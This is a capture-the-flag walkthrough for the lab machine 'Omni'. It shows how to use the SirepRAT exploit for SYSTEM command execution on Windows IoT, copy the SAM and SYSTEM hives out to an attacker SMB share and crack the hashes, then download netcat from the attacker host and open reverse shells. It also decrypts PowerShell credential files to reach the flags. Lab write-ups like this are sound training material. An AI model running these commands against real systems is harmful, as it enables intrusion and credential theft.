## Omni

Difficulty: Easy

### User Flag

rustscan -a 10.10.10.204 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/fe556e48-9428-48a8-9ca3-ef3cf9949452)

<br>

Port 8080 needs authentication.

![port8080](https://github.com/b1d0ws/OSCP/assets/58514930/dfd1b671-69e4-479f-bc43-fef6cac56051)

<br>

Searching for Windows Device Portal exploit, we find a exploit github repository.

![searchingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/6cf24985-6e52-48cb-9b48-f6ad3cd829ef)

<br>

With this exploit, we execute remote commands.  

Using the command below, we check that our user profile is SYSTEM.

```
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}" --v
```

![userProfile](https://github.com/b1d0ws/OSCP/assets/58514930/b33ba51e-5c82-415d-9e5a-86f745512297)

<br>

Being SYSTEM we can dump SAM and SYSTEM to extract hashes. Let's also create a SMB directory to get this files.

```
# Configuring SMB
vim /etc/samba/smb.conf

[Public]
path = /tmp/Public
writable = yes
guest ok = yes
guest only = yes
create mode = 0777
directory mode = 077
force user = nobody

mkdir /tmp/Public
chmod 777 /tmp/Public
service smbd restart

# Dumping SAM and SYSTEM
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c reg save HKLM\SYSTEM C:\SYSTEM"
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c reg save HKLM\SAM C:\SAM"

# Copying to our smb server
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c copy C:\SYSTEM \\\\10.10.14.21\\Public\\SYSTEM"
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c copy C:\SAM \\\\10.10.14.21\\Public\\SAM"
```

![creatingSmbDirectory](https://github.com/b1d0ws/OSCP/assets/58514930/ad43d41b-c657-4976-88ca-b9d6290c81fd)

![savingSamSystem](https://github.com/b1d0ws/OSCP/assets/58514930/6fd6e314-f596-42e3-b6c6-5a07d1d68d5f)

<br>

Crack with secretsdump and john

```
impacket-secretsdump -sam SAM -system SYSTEM local

john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```

![secretsDump](https://github.com/b1d0ws/OSCP/assets/58514930/393b50f1-6220-4a9b-a294-054d7ebdb260)

![john](https://github.com/b1d0ws/OSCP/assets/58514930/5116d28c-61a1-4e47-9421-7e491c824e30)

<br>

Now we can access port 8080 and login with app user.

On Windows Device Portal, there is a tab to run commands.

```
powershell -command iwr -Uri http://10.10.14.21:8000/nc64.exe -OutFile C:\Windows\Temp\nc64.exe

C:\Windows\Temp\nc64.exe -e cmd.exe 10.10.14.21 1337
```

![gettingReverse](https://github.com/b1d0ws/OSCP/assets/58514930/3f4b76e1-7a18-47f3-a283-0b80163f7fb7)

<br>

Inside app's home, user.txt is in powershell secretstring format.

```
powershell -c "$credential = import-clixml -path C:\Data\Users\app\user.txt;$credential.GetNetworkCredential().password"
```

![userTxt](https://github.com/b1d0ws/OSCP/assets/58514930/6928e3ca-9019-4c65-a5a5-fff561ccdd40)

<br>

We could direct get a reverse shell with SirepRAT exploit using the commands below, but with omni user and not app.

```
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell IWR -Uri http://10.10.14.21:8000/nc64.exe -Outfile c:\nc64.exe"

python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c c:\nc64.exe -e powershell 10.10.14.21 9001"
```

<br>

### Root Flag

Inside app's desktop, iot-admin.xml is another secretstring file.  

Decrypting it with powershell, we find the administrator password.

```
powershell -c "$credential = import-clixml -path C:\Data\Users\app\iot-admin.xml;$credential.GetNetworkCredential().password"
```

![iotAdminXML](https://github.com/b1d0ws/OSCP/assets/58514930/f4a13e62-8b28-46e6-9318-0e51ae71fb1d)

<br>

Login into Windows Device Portal as administrator with this credentials.

```
powershell -c "$credential = import-clixml -path C:\Data\Users\administrator\root.txt;$credential.GetNetworkCredential().password"
```

![rootFlag](https://github.com/b1d0ws/OSCP/assets/58514930/245e1915-7bea-4a94-8432-4f12e73b81c4)
